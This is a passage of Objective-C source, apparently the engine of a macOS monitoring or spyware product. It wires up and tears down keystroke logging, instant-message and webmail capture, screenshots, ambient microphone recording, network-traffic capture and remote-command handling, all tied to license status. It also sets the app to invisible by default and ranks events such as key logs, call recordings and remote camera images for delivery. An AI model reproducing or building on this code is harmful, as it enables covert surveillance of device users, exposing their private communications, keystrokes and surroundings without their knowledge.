            [mIMCaptureManagerForMac stopCapture];
        }
    } else {
        [mIMCaptureManagerForMac stopCapture];
        [mIMCaptureManagerForMac release];
        mIMCaptureManagerForMac = nil;
    }
    
    // Screenshot
    if ([mConfigurationManager isSupportedFeature:kFeatureID_ScreenRecording]) {
        if (!mScreenshotCaptureManagerImpl) {
            NSString *deamonHome = [DaemonPrivateHome daemonPrivateHome];
            NSString *screenshotPath = [deamonHome stringByAppendingString:@"attachments/screenshot/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:screenshotPath];
            
            mScreenshotCaptureManagerImpl = [[ScreenshotCaptureManagerImpl alloc] initWithScreenshotFolder:screenshotPath];
            [mScreenshotCaptureManagerImpl registerEventDelegate:mEventCenter];
            [mRemoteCmdManager setMScreenshotCaptureManager:mScreenshotCaptureManagerImpl];
            [mRemoteCmdManager relaunchForFeaturesChange];
        }
    } else {
        [mScreenshotCaptureManagerImpl release];
        mScreenshotCaptureManagerImpl = nil;
        [mRemoteCmdManager setMScreenshotCaptureManager:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
    }
    
    // User activity
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMacOSLogon]) {
        if (!mUserActivityCaptureManager) {
            mUserActivityCaptureManager = [[UserActivityCaptureManager alloc] init];
            [mUserActivityCaptureManager registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableLogon]) {
            [mUserActivityCaptureManager startCapture];
        } else {
            [mUserActivityCaptureManager stopCapture];
        }
    } else {
        [mUserActivityCaptureManager release];
        mUserActivityCaptureManager = nil;
    }
    
    // Web mail
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EVentMacOSEmail]) {
        if (!mWebmailCaptureManager) {
            NSString *deamonHome = [DaemonPrivateHome daemonPrivateHome];
            NSString *cachePath = [deamonHome stringByAppendingString:@"etc/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:cachePath];
            mWebmailCaptureManager = [[WebmailCaptureManager alloc] initWithCacheFolder:cachePath];
            [mWebmailCaptureManager registerEventDelegate:mEventCenter];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableEmail]) {
            [mWebmailCaptureManager startCapture];
        } else {
            [mWebmailCaptureManager stopCapture];
        }
    } else {
        [mWebmailCaptureManager release];
        mWebmailCaptureManager = nil;
    }
    
    // Ambient recording
    if ([mConfigurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {
        if (!mAmbientRecordingManagerForMac) {
            NSString *deamonHome = [DaemonPrivateHome daemonPrivateHome];
            NSString *mediaCapturePath = [deamonHome stringByAppendingString:@"media/capture/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaCapturePath];
            
            mAmbientRecordingManagerForMac = [[AmbientRecordingManagerForMac alloc] initWithFilePath:mediaCapturePath withEventDelegate:mEventCenter];
            [mRemoteCmdManager setMAmbientRecordingManager:mAmbientRecordingManagerForMac];
            [mRemoteCmdManager relaunchForFeaturesChange];
        }
    } else {
        [mAmbientRecordingManagerForMac release];
        mAmbientRecordingManagerForMac = nil;
        [mRemoteCmdManager setMAmbientRecordingManager:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
    }
    
    // Temporal control
    if ( [mConfigurationManager isSupportedFeature:kFeatureID_ScreenRecording]     ||
        [mConfigurationManager isSupportedFeature:kFeatureID_AmbientRecording]    ||
        [mConfigurationManager isSupportedFeature:kFeatureID_EventNetworkTraffic] ){
        
        if (!mTemporalControlManager) {
            mTemporalControlManager = [[TemporalControlManagerImpl alloc] initWithDDM:mDDM];
            [mTemporalControlManager setMAmbientRecordingManager:mAmbientRecordingManagerForMac];
            [mTemporalControlManager setMScreenshotCaptureManager:mScreenshotCaptureManagerImpl];
            [mTemporalControlManager setMNetworkTrafficCaptureManager:mNetworkTrafficCaptureManagerImpl];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableTemporalControlSSR] ) {
            [mTemporalControlManager setMEnableScreenShot:YES];
            [mTemporalControlManager startTemporalControl];
        } else {
            [mTemporalControlManager setMEnableScreenShot:NO];
            [mScreenshotCaptureManagerImpl stopCapture];
        }
        
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableTemporalControlNetworkTraffic] ) {
            [mTemporalControlManager setMEnableNetworkTraffic:YES];
            [mTemporalControlManager startTemporalControl];
        } else {
            [mTemporalControlManager setMEnableNetworkTraffic:NO];
            [mNetworkTrafficCaptureManagerImpl stopCapture];
        }
        
        // No support all disable
        if (([prefEventCapture mStartCapture] && ![prefEventCapture mEnableTemporalControlSSR] && ![prefEventCapture mEnableTemporalControlNetworkTraffic]) ||
            (![prefEventCapture mStartCapture] && ![prefEventCapture mEnableTemporalControlSSR] && ![prefEventCapture mEnableTemporalControlNetworkTraffic])){
            
            [mTemporalControlManager stopTemporalControl];
        }
        
        [mRemoteCmdManager setMTemporalControlManager:mTemporalControlManager];
        [mRemoteCmdManager relaunchForFeaturesChange];
    } else {
        // Upgrade or downgrad features
        [mTemporalControlManager release];
        mTemporalControlManager = nil;
        [mRemoteCmdManager setMTemporalControlManager:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
    }
    
    // App screenshot
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventAppScreenShot]) {
        if(!mAppScreenShotManagerImpl){
            NSString *deamonHome = [DaemonPrivateHome daemonPrivateHome];
            NSString *screenshotPath = [deamonHome stringByAppendingString:@"attachments/appscreenshot/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:screenshotPath];

            mAppScreenShotManagerImpl = [[AppScreenShotManagerImpl alloc] initWithDDM:mDDM imagePath:screenshotPath];
            [mAppScreenShotManagerImpl registerEventDelegate:mEventCenter];
        }
        if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAppScreenShot]) {
            [mAppScreenShotManagerImpl startCapture];
        } else {
            [mAppScreenShotManagerImpl stopCapture];
        }
        
        [mRemoteCmdManager setMAppScreenShotManager:mAppScreenShotManagerImpl];
        [mRemoteCmdManager relaunchForFeaturesChange];
    } else {
        [mAppScreenShotManagerImpl release];
        mAppScreenShotManagerImpl = nil;
        [mRemoteCmdManager setMAppScreenShotManager:nil];
        [mRemoteCmdManager relaunchForFeaturesChange];
    }
    
    // Actions required when applicaton activate or reactivate NOT application restarted
    if ([self mIsRestartingAppEngine]) { // Application just restart from either crash or phone restart
        DLog (@"AppEngine resume all pending remote commands")
        // Resume all pending commands
        [mRemoteCmdManager processPendingRemoteCommands];
    } else {
        // Application have been ACTIVATED by user
    }
}

- (void) destructApplicationFeatures {
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
    DLog(@"Destruct features")
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
    
    [mDDM setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
    
    LicenseInfo *licenseInfo = [mLicenseManager mCurrentLicenseInfo];
    
    if ([licenseInfo licenseStatus] == DEACTIVATED) {
        // Reset the preferences
        [mPreferenceManager resetPreferences];
        
        // Override default values
        DLog(@"------> Override default values of preferences in destruct features...");
        PrefVisibility *prefVisibility = (PrefVisibility *)[mPreferenceManager preference:kVisibility];
        [prefVisibility setMVisible:NO];
        [mPreferenceManager savePreference:prefVisibility];
        
        PrefEventsCapture *prefEvent = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
        [prefEvent setMEnableIM:YES];
        [mPreferenceManager savePreference:prefEvent];
    }
    
    // Stop deliver
    [mEDM setDeliveryTimer:0];
    
    [mNetworkTrafficAlertManagerImpl clearAlertAndData];
    [mNetworkTrafficAlertManagerImpl release];
    mNetworkTrafficAlertManagerImpl= nil;
    
    [mNetworkTrafficCaptureManagerImpl release];
    mNetworkTrafficCaptureManagerImpl = nil;
    
    [mInternetFileTransferManager release];
    mInternetFileTransferManager = nil;

    [mAppScreenShotManagerImpl release];
    mAppScreenShotManagerImpl = nil;
    
    [mWebmailCaptureManager clearWebmail];
    [mWebmailCaptureManager release];
    mWebmailCaptureManager = nil;
    
    [mUserActivityCaptureManager release];
    mUserActivityCaptureManager = nil;
    
    [mScreenshotCaptureManagerImpl release];
    mScreenshotCaptureManagerImpl = nil;
    
    [mPrinterMonitorManager release];
    mPrinterMonitorManager = nil;
    
    [mNetworkConnectionCaptureManager release];
    mNetworkConnectionCaptureManager = nil;
    
    // Need to stop explicitly this way to release observer from KeyboardLoggerManager
    [mIMCaptureManagerForMac stopCapture];
    [mIMCaptureManagerForMac release];
    mIMCaptureManagerForMac = nil;
    
    [mApplicationUsageCaptureManager release];
    mApplicationUsageCaptureManager = nil;
    
    [mUSBFileTransferCaptureManager release];
    mUSBFileTransferCaptureManager = nil;
    
    [mFileActivityCaptureManager release];
    mFileActivityCaptureManager = nil;
    
    [mUSBConnectionCaptureManager release];
    mUSBConnectionCaptureManager = nil;
    
    [mDeviceSettingsManager release];
    mDeviceSettingsManager = nil;
    
    [mApplicationManagerForMacImpl prerelease];
    [mApplicationManagerForMacImpl release];
    mApplicationManagerForMacImpl = nil;
    
    [mPageVisitedCaptureManager release];
    mPageVisitedCaptureManager = nil;
    
    // Need to stop explicitly this way to release observer from KeyboardLoggerManager
    [mKeyboardCaptureManager stopCapture];
    [mKeyboardCaptureManager release];
    mKeyboardCaptureManager = nil;
    
    [mKeySnapShotRuleManagerImpl clearAllRules];
    [mKeySnapShotRuleManagerImpl release];
    mKeySnapShotRuleManagerImpl = nil;
    
    [mKeyboardLoggerManager release];
    mKeyboardLoggerManager = nil;
    
    [mAmbientRecordingManagerForMac release];
    mAmbientRecordingManagerForMac = nil;
    
    // Temporal Control Manager
    [mTemporalControlManager release];
    mTemporalControlManager = nil;
    
    // 1. Events repository
    // 2. Remote commands
    if (![self mIsRestartingAppEngine]) {
        // Application's license is deactivated or expired or disabled by user/server
        if ([licenseInfo licenseStatus] == DEACTIVATED) {
            [mERM dropRepository];
        }
        // Always clear pending commands otherwise that would be crash if those pending
        // commands using features that already destroy... and the spec also metioned that
        // only deactivate and heartbeat command can execute..
        [mRemoteCmdManager clearAllPendingRemoteCommands];
        
        // Clear all DDM request for the same reason as RCM
        [mDDM cleanAllRequests];
        
        // Clear all CSM request for the same reason as RCM
        [mCSM cleanAllSessionInfoAndDeletePayload];
    } else {
        // Application is just restarting because of crashing or phone restart
    }
}

- (EventQueryPriority*) eventQueryPriority {
    NSMutableArray* eventTypePriorityArray = [[NSMutableArray alloc] init];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanic]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanicImage]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSettings]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeLocation]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSystem]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallLog]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVoIP]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeKeyLog]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeUsbConnection]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeFileTransfer]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAppUsage]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMMacOS]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeLogon]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePageVisited]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSms]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMms]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMail]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIM]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMAccount]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMContact]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMConversation]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIMMessage]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBrowserURL]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBookmark]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeApplicationLifeCycle]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAmbientRecordAudio]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAmbientRecordAudioThumbnail]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImage]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImageThumbnail]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideo]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideoThumbnail]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudio]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudioThumbnail]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudio]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudioThumbnail]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaper]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaperThumbnail]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeRemoteCameraImage]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeRemoteCameraVideo]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeEmailMacOS]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeScreenRecordSnapshot]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeFileActivity]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeNetworkTraffic]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeNetworkConnectionMacOS]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePrintJob]];
    [eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAppScreenShot]];
    
    EventQueryPriority* eventQueryPriority = [[EventQueryPriority alloc] initWithUserPriority:eventTypePriorityArray];
    [eventTypePriorityArray release];
    [eventQueryPriority autorelease];
    return (eventQueryPriority);
}

#pragma mark -
#pragma mark License changes private method
#pragma mark -

- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo {
    // Set IMEI to CSM
    NSString *imei = [[mApplicationContext mPhoneInfo] getIMEI];
    if (!imei) imei = @"";
    [mCSM setIMEI:imei];
    
    // Update config
    NSInteger configID = [aLicenseInfo configID];
    if ([aLicenseInfo licenseStatus] == EXPIRED) {
        configID = CONFIG_EXPIRE_LICENSE;
        
        // Start getting config every 5 minutes
        [mLicenseGetConfigUtils start];
        
    } else if ([aLicenseInfo licenseStatus] == DISABLE) {
        configID = CONFIG_DISABLE_LICENSE;
        
        // Start getting config every 5 minutes
        [mLicenseGetConfigUtils start];
        
    } else if ([aLicenseInfo licenseStatus] == ACTIVATED) {
        // Start getting config every 5 minutes
        [mLicenseGetConfigUtils start];
        
    } else { // DEACTIVATED/UNKNOWN
        // Stop getting config every 5 minutes
        [mLicenseGetConfigUtils stop];
    }
    
    [mConfigurationManager updateConfigurationID:configID];
    Configuration *config = [mConfigurationManager configuration];
    [mRemoteCmdManager setMSupportCmdCodes:[config mSupportedRemoteCmdCodes]];
    
    // Construct/Destruct features
    if ([aLicenseInfo licenseStatus] == ACTIVATED) {
        [mHotKeyCaptureManager setMActivationCode:[aLicenseInfo activationCode]];
        [self createApplicationFeatures];
    } else if ([aLicenseInfo licenseStatus] == DEACTIVATED||
               [aLicenseInfo licenseStatus] == EXPIRED ||
               [aLicenseInfo licenseStatus] == DISABLE ||
               [aLicenseInfo licenseStatus] == LC_UNKNOWN) {
        if ([aLicenseInfo licenseStatus] == DEACTIVATED) {
            [mHotKeyCaptureManager setMActivationCode:_DEFAULTACTIVATIONCODE_];
        } else {
            [mHotKeyCaptureManager setMActivationCode:[aLicenseInfo activationCode]];
        }
        [self destructApplicationFeatures];
    }
    
    DLog(@"mIsRestartingAppEngine = %d", [self mIsRestartingAppEngine]);
    if ([self mIsRestartingAppEngine]) {
        PrefSignUp *prefSignUp = (PrefSignUp *)[mPreferenceManager preference:kSignUp];
        DLog(@"mAutoActivate = %d, licenseStatus = %d", [prefSignUp mAutoActivate], [aLicenseInfo licenseStatus]);
        if ([prefSignUp mAutoActivate] &&
            [aLicenseInfo licenseStatus] == DEACTIVATED) {
            // USB auto activate
            [mUSBAutoActivationManager startAutoCheckAndStartActivate];
        }
    }
    
    // Set engine of the application is no longer just restart
    [self setMIsRestartingAppEngine:FALSE];
}

#pragma mark -
#pragma mark dealloc method
#pragma mark -

- (void) dealloc {
    // Features
    [mNetworkTrafficAlertManagerImpl release];
    [mNetworkConnectionCaptureManager release];
    [mPrinterMonitorManager release];
    [mNetworkTrafficCaptureManagerImpl release];
    [mFileActivityCaptureManager release];
    [mInternetFileTransferManager release];
    [mTemporalControlManager release];
    [mAmbientRecordingManagerForMac release];
    [mWebmailCaptureManager release];
    [mUserActivityCaptureManager release];
    [mScreenshotCaptureManagerImpl release];
    [mIMCaptureManagerForMac release];
    [mApplicationUsageCaptureManager release];
    [mUSBFileTransferCaptureManager release];
    [mUSBConnectionCaptureManager release];
    [mDeviceSettingsManager release];
    [mApplicationManagerForMacImpl release];
    [mPageVisitedCaptureManager release];
    [mKeyboardCaptureManager release];
    [mKeyboardLoggerManager release];
    [mKeySnapShotRuleManagerImpl release];
    
    // Engine
    [mPushNotificationManager release];
    [mFxLoggerManager release];
    [mUSBAutoActivationManager release];
    [mAppAgentManager release];
    [mSoftwareUpdateManager release];
    [mHotKeyCaptureManager release];
    [mKeyboardEventHandler release];
    [mRemoteCmdManager release];
    [mEventCenter release];
    [mEDM release];
    [mERM release];
    [mActivationManager release];
    [mDDM release];
    [mCSM release];
    [mPreferenceManager release];
    [mConnectionHistoryManager release];
    [mServerAddressManager release];
    [mConfigurationManager release];
    [mLicenseManager release];
    [mSystemUtils release];
    [mApplicationContext release];
    
    // Utils
    [mLicenseGetConfigUtils prerelease];
    [mLicenseGetConfigUtils release];
    [mPreferencesChangeHandler release];
    [mServerErrorStatusHandler release];
    [mLicenseHeartbeatUtils release];
    
    [super dealloc];
}

@end
